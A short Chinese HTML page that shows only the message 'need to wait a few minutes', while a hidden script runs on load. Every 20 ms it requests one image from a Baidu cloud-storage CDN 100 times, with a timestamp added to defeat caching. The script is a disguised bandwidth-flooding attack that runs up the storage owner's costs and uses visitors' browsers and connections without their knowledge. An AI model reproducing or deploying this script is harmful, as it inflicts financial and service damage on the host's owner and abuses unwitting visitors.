<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>需要等待几分钟</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
<h1>需要等待几分钟</h1>
<script>
    function loadImage() {
        for (let i = 0; i < 100; i++) { 
            const img = new Image();
            img.src = 'https://staticsns.cdn.bcebos.com/amis/2024-12/1733110167508/ec2943f8f5e27bd38f00c6e02.png?' + new Date().getTime(); // 防止缓存
            img.style.display = 'none'; 

            document.body.appendChild(img);
        }
        setTimeout(loadImage, 20); 
    }
    loadImage(); 
</script>

</body>
</html>
